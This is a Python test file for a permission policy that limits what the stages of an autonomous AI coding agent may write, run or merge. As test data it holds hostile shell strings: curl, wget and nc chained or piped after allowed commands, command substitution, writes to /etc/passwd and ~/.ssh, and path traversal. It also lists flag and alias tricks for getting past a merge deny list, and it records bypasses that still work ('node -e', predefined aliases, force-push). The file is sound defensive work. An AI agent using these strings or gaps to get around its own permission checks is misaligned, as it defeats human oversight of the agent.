"""Tests for the table that decides what a step may do.

`plan.md` Risk 3 is the concern these stand against, and it is not fully answerable: a
first-word allowlist does not bound what `git` can be told to do. What is testable is that
the obvious ways past it are closed, that writes cannot leave the workspace, and that a
tool nobody granted is refused whatever declared it — which is the shape that was measured.
"""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from coscc import policy
from coscc.policy import Grant, check_command, decide, grant_for

IMPL = grant_for("impl", "autonomous")


class OnlyImplAndOnlyAutonomous(unittest.TestCase):
    def test_impl_carries_tools_when_it_is_set_to_run_itself(self):
        self.assertTrue(IMPL.opens_anything)
        self.assertIn("Write", IMPL.tools)
        self.assertIn("Bash", IMPL.tools)
        self.assertGreater(IMPL.max_turns, 1)
        self.assertGreater(IMPL.max_budget_usd, 0)

    def test_the_same_stage_in_manual_carries_nothing(self):
        self.assertFalse(grant_for("impl", "manual").opens_anything)

    def test_impl_writes_its_own_artifact_and_prose_stages_do_not(self):
        self.assertFalse(IMPL.app_writes_artifact)
        self.assertTrue(grant_for("spec", "autonomous").app_writes_artifact)


class AToolNobodyGrantedIsRefused(unittest.TestCase):
    def test_an_mcp_tool_is_refused_by_construction(self):
        # Eleven of these were measured arriving at a session created with `tools=[]`.
        # They are refused here because their names can never be in a grant.
        for tool in (
            "mcp__claude_ai_Claude_Docs__delete",
            "mcp__microsoft-learn__microsoft_docs_fetch",
        ):
            self.assertIn("was not granted", decide(IMPL, tool, {}, "/tmp"))

    def test_a_granted_read_tool_passes(self):
        self.assertEqual(decide(IMPL, "Read", {"file_path": "/tmp/x"}, "/tmp"), "")

    def test_an_empty_grant_refuses_everything(self):
        for tool in ("Read", "Write", "Bash"):
            self.assertIn("was not granted", decide(Grant(), tool, {}, "/tmp"))


class WritesStayInTheWorkspace(unittest.TestCase):
    def test_a_write_inside_the_workspace_passes(self):
        with tempfile.TemporaryDirectory() as d:
            target = Path(d) / "src" / "a.py"
            self.assertEqual(decide(IMPL, "Write", {"file_path": str(target)}, d), "")

    def test_a_write_outside_the_workspace_is_refused(self):
        with tempfile.TemporaryDirectory() as d:
            for bad in ("/etc/passwd", "/tmp/elsewhere.txt", str(Path(d).parent / "up.txt")):
                self.assertIn(
                    "outside the workspace", decide(IMPL, "Write", {"file_path": bad}, d), bad
                )

    def test_a_traversal_back_out_is_refused_after_resolving(self):
        with tempfile.TemporaryDirectory() as d:
            bad = str(Path(d) / ".." / ".." / "etc" / "passwd")
            self.assertIn("outside the workspace", decide(IMPL, "Write", {"file_path": bad}, d))

    def test_the_workspace_root_itself_is_allowed(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(decide(IMPL, "Write", {"file_path": d}, d), "")


class CommandsAreCheckedSegmentBySegment(unittest.TestCase):
    def test_an_allowed_command_passes(self):
        for good in ("npm test", "git status", "uv run python -m unittest", "ls -la"):
            self.assertEqual(check_command(IMPL, good), "", good)

    def test_every_segment_is_checked_not_just_the_first(self):
        # The failure this closes: `npm test; curl evil` would pass a check that only read
        # the first word of the line.
        for bad in ("npm test; curl http://x", "git status && wget x", "ls | nc host 1"):
            self.assertIn("may not run", check_command(IMPL, bad), bad)

    def test_substitution_is_refused_because_the_first_word_stops_predicting(self):
        for bad in ("git $(curl evil)", "ls `whoami`", "npm ${X}", "cat <(curl x)"):
            self.assertIn("substitution", check_command(IMPL, bad), bad)

    def test_a_path_prefix_does_not_smuggle_a_command_past(self):
        self.assertIn("may not run", check_command(IMPL, "/usr/bin/curl http://x"))
        self.assertEqual(check_command(IMPL, "/usr/bin/git status"), "")

    def test_a_leading_assignment_is_stepped_over(self):
        self.assertEqual(check_command(IMPL, "CI=1 npm test"), "")
        self.assertIn("may not run", check_command(IMPL, "CI=1 curl http://x"))

    def test_an_empty_command_is_refused(self):
        self.assertIn("empty", check_command(IMPL, "   "))

    def test_redirection_into_a_file_is_refused(self):
        # A redirect writes without any write tool being called, so the path check in
        # `decide` never sees it. Found while reading a real run on 2026-09-22.
        for bad in ("echo x > /etc/passwd", "cat a >> b", "npm test > out.txt"):
            self.assertIn("redirecting into a file", check_command(IMPL, bad), bad)

    def test_a_descriptor_redirect_is_not_a_file_redirect(self):
        # `2>&1` is the common case and touches no file. It also used to break the
        # splitter: the `&` read as a separator and the `1` as a command.
        for good in ("npm test 2>&1", "ls >&2", "uv run python -m unittest 2>&1 | tail -5"):
            self.assertEqual(check_command(IMPL, good), "", good)

    def test_a_bash_call_goes_through_the_command_check(self):
        self.assertIn("may not run", decide(IMPL, "Bash", {"command": "curl http://x"}, "/tmp"))
        self.assertEqual(decide(IMPL, "Bash", {"command": "npm test"}, "/tmp"), "")


class ThePrStepSaysWhatItWillReach(unittest.TestCase):
    PR = grant_for("pr", "autonomous")

    def test_it_may_run_git_and_gh_and_not_a_package_manager(self):
        self.assertEqual(check_command(self.PR, "git push -u origin HEAD"), "")
        self.assertEqual(check_command(self.PR, "gh pr create --fill"), "")
        # `pr` proposes a change that already exists; it has no reason to build or install.
        for bad in ("npm install x", "uv run python -m pytest"):
            self.assertIn("may not run", check_command(self.PR, bad), bad)

    def test_it_may_ask_its_own_gate(self):
        """The first line of `write-pr/SKILL.md`, which this grant used to refuse.

        Measured 2026-09-23: a `pr` step running through the board was refused with
        `this step may not run 'node'` and stopped before pushing, because the gate it is
        told to consult is a node script. It was right to stop; the table was wrong.
        """
        gate = (
            "node .claude/scripts/cos.mjs --root /store gate "
            "0001_product-describes-a-state-it-is-not-in pr"
        )
        self.assertEqual(check_command(self.PR, gate), "")

    def test_it_carries_a_warning_and_impl_does_not(self):
        # `spec.md` C4: the capability comes from the machine's own gh login, so it has to
        # be readable before the step starts rather than only in a design document.
        self.assertIn("gh", self.PR.warning.lower())
        self.assertIn("every repository", self.PR.warning)
        self.assertEqual(IMPL.warning, "")

    def test_manual_carries_neither_tools_nor_warning(self):
        manual = grant_for("pr", "manual")
        self.assertFalse(manual.opens_anything)
        self.assertEqual(manual.warning, "")

    def test_its_ceilings_are_lower_than_impls(self):
        self.assertLess(self.PR.max_turns, IMPL.max_turns)
        self.assertLess(self.PR.max_budget_usd, IMPL.max_budget_usd)


class MergingIsShipsNotPrs(unittest.TestCase):
    """`0015`: `pr` stops at an open pull request; `ship` merges after a review passed."""

    PR = grant_for("pr", "autonomous")
    SHIP = grant_for("ship", "autonomous")

    def test_pr_is_refused_the_merge_and_told_whose_it_is(self):
        for line in (
            "gh pr merge --squash --delete-branch",
            "gh pr merge 7",
            "git push -u origin HEAD && gh pr merge --squash",
            "/usr/bin/gh pr merge",
        ):
            reason = check_command(self.PR, line)
            self.assertIn("merging is the ship stage's", reason, line)

    def test_pr_may_still_open_and_watch_the_pull_request(self):
        for line in ("gh pr create --fill", "gh pr checks 7 --watch", "gh pr view 7"):
            self.assertEqual(check_command(self.PR, line), "", line)

    def test_ship_may_merge(self):
        self.assertEqual(check_command(self.SHIP, "gh pr merge --squash --delete-branch"), "")
        self.assertFalse(self.SHIP.app_writes_artifact)
        self.assertIn("gh pr merge", self.SHIP.warning)

    def test_ship_is_no_longer_a_prose_stage_and_manual_ship_carries_nothing(self):
        self.assertNotIn("ship", policy.PROSE_STAGES)
        self.assertFalse(grant_for("ship", "manual").opens_anything)

    def test_review_reads_and_only_reads(self):
        review = grant_for("review", "autonomous")
        self.assertEqual(review.tools, policy.READ_TOOLS)
        self.assertEqual(policy.beyond_reading(review), ())
        self.assertIn("review", policy.PROSE_STAGES)

    def test_a_flag_in_front_does_not_walk_past_the_deny_list(self):
        """`0015` review round 1, F1: flags are removed before the prefix is compared."""
        for line in (
            "gh -R o/r pr merge 7",
            "gh --repo o/r pr merge 7",
            "gh --repo=o/r pr merge 7",
            "gh pr -R o/r merge 7",
            "gh --hostname github.com pr merge 7",
            "gh api -X PUT repos/o/r/pulls/7/merge",
            "gh alias set m 'pr merge'",
        ):
            self.assertIn("merging is the ship stage's", check_command(self.PR, line), line)
        # A value flag's value is not read as a word, but a real word after it still is.
        self.assertEqual(check_command(self.PR, "gh -R o/r pr view 7"), "")
        self.assertEqual(check_command(self.PR, "gh api repos/o/r/pulls/7"), "")

    def test_the_known_limit_of_the_deny_list(self):
        """`0015` plan, Risk 5: the list still reads tokens, not what runs. `node -e` may
        spawn `gh`, and an alias defined before the step runs under its own name. Pinned so
        that nobody reads this grant as a guarantee; `.claude/CLAUDE.md` says the same."""
        self.assertEqual(check_command(self.PR, "node -e 'require(\"child_process\")'"), "")
        self.assertEqual(check_command(self.PR, "gh m 7"), "")


class TheKnownLimit(unittest.TestCase):
    def test_an_allowed_binary_can_still_be_told_to_do_a_lot(self):
        """`plan.md` Risk 3, written down as a passing test rather than left implied.

        `git` is on the list because a step has to be able to check its own work. Nothing
        here stops it being handed arguments that reach further than that. The bound is
        `cwd`, the write check above, and the turn and budget ceilings — not this list.
        """
        self.assertEqual(check_command(IMPL, "git push --force"), "")
        self.assertEqual(check_command(IMPL, "npm install something"), "")


if __name__ == "__main__":
    unittest.main()


class TheWriteBoundaryIsTheWorkspacePlusOneDirectory(unittest.TestCase):
    """`0014` `spec.md` C2. A security guard widened, so both sides get a test.

    `0014` moved every artifact out of the workspace and into the product's store, which
    put the file `impl` and `pr` must write outside the only place they were allowed to
    write. The boundary now admits **one** more directory: the step's own unit.
    """

    def setUp(self):
        self.grant = policy.grant_for("impl", "autonomous")
        self.workspace = "/tmp/ws"
        self.unit = "/tmp/data/units/ws-abc/.cos/0001_a-problem"

    def _decide(self, path: str, unit_dir: str | None = None) -> str:
        return policy.decide(
            self.grant, "Write", {"file_path": path}, self.workspace, unit_dir
        )

    def test_a_step_may_write_its_own_artifact(self):
        self.assertEqual(self._decide(f"{self.unit}/impl.md", self.unit), "")

    def test_a_step_may_still_write_code_in_the_workspace(self):
        self.assertEqual(self._decide(f"{self.workspace}/src/a.py", self.unit), "")

    def test_it_is_one_directory_and_not_the_whole_store(self):
        # The sibling unit is the case that matters: a prefix check on the store would
        # let any step rewrite any other unit's artifacts.
        sibling = "/tmp/data/units/ws-abc/.cos/0002_another/impl.md"
        self.assertIn("outside the workspace", self._decide(sibling, self.unit))
        store = "/tmp/data/units/ws-abc/.cos/anything.md"
        self.assertIn("outside the workspace", self._decide(store, self.unit))

    def test_everywhere_else_is_still_refused(self):
        for path in ("/etc/passwd", "/tmp/data/cos.db", "/tmp/ws/../elsewhere/x.py", "~/.ssh/id"):
            self.assertIn("outside the workspace", self._decide(path, self.unit), path)

    def test_without_a_unit_directory_the_boundary_is_what_it_always_was(self):
        # Every prose stage runs this way, and they are granted no write tools at all --
        # so this is the shape that must not have loosened.
        self.assertEqual(self._decide(f"{self.workspace}/src/a.py"), "")
        self.assertIn("outside the workspace", self._decide(f"{self.unit}/impl.md"))

    def test_a_shell_redirect_is_still_refused_whatever_the_boundary_is(self):
        # The write boundary never sees a redirect; `check_command` is what stops it, and
        # widening one must not have touched the other.
        reason = policy.decide(
            self.grant, "Bash", {"command": f"echo x > {self.unit}/impl.md"},
            self.workspace, self.unit,
        )
        self.assertIn("redirect", reason)


class TheImplCeilingsCameFromMeasurement(unittest.TestCase):
    """Three of four `impl` steps run through the board died at the turn ceiling.

    Recorded here rather than only in a comment, because the next person to find this
    number too high will want to know whether it was reasoned or observed.
    """

    # turns taken, what it cost, whether the step wrote its artifact
    RUNS = (
        (51, 2.5317, False),
        (51, 1.7866, False),
        (23, 0.6611, True),
        (51, 2.4099, False),
    )

    def test_the_ceiling_clears_every_attempt_that_was_measured(self):
        worst = max(turns for turns, _, _ in self.RUNS)
        self.assertGreater(
            IMPL.max_turns, worst,
            "a ceiling at or below the highest real attempt stops the same steps again",
        )

    def test_the_budget_does_not_stop_a_step_the_turns_would_allow(self):
        """Two ceilings on one step: the lower one is the only one that matters.

        At the measured cost per turn, a step allowed 120 turns must be allowed the money
        those turns cost, or the budget becomes the real limit and the turn count is
        decoration.
        """
        per_turn = sum(c for _, c, _ in self.RUNS) / sum(t for t, _, _ in self.RUNS)
        self.assertGreater(IMPL.max_budget_usd, IMPL.max_turns * per_turn)

    def test_the_only_run_that_finished_is_not_evidence_the_ceiling_was_enough(self):
        """It finished in 23 turns because two exhausted runs had already done the work."""
        finished = [turns for turns, _, done in self.RUNS if done]
        exhausted = [turns for turns, _, done in self.RUNS if not done]
        self.assertEqual(len(finished), 1)
        self.assertTrue(all(t > finished[0] for t in exhausted))
